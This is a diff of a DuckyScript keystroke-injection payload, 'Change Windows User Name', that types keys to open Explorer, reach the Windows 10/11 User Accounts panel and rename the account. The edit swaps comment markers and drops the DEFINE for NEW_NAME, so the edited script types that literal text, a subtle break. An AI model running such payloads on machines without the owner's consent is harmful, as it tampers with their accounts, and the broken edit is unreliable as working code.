@@ -1,33 +1,31 @@
-REM #############################################
-REM #                                           |
-REM # Title        : Change Windows User Name   |
-REM # Author       : Aleff                      |
-REM # Version      : 1.0                        |
-REM # Category     : Execution                  |
-REM # Target       : Windows 10/11              |
-REM #                                           |
-REM #############################################
+* #############################################
+* #                                           |
+* # Title        : Change Windows User Name   |
+* # Author       : Aleff                      |
+* # Version      : 1.0                        |
+* # Category     : Execution                  |
+* # Target       : Windows 10/11              |
+* #                                           |
+* #############################################
 
-REM Requirements:
-REM     - Nothing
+* Requirements:
+*     - Nothing
 
-REM Note:
-REM     - Payload tested on Windows 11 Eng 
+* Note:
+*     - Payload tested on Windows 11 Eng 
 
-REM Set the new name that you want to set
-DEFINE NEW_NAME example
 
-REM Open Windows research
+* Open Windows research
 DELAY 2000
 GUI
 DELAY 1000
 
-REM Search and opern explorer app
+* Search and opern explorer app
 STRING explorer
 ENTER
 DELAY 1000
 
-REM Goto search bar and open User Accounts settings
+* Goto search bar and open User Accounts settings
 TAB
 DELAY 500
 TAB
@@ -40,12 +38,13 @@ STRING Control Panel\All Control Panel Items\User Accounts
 ENTER
 DELAY 1500
 
-REM Goto "Change you account name"
+* Goto "Change you account name"
 TAB
 DELAY 500
 ENTER
 DELAY 500
 
+* Set the new name that you want to set
 STRING NEW_NAME
 DELAY 500
 TAB
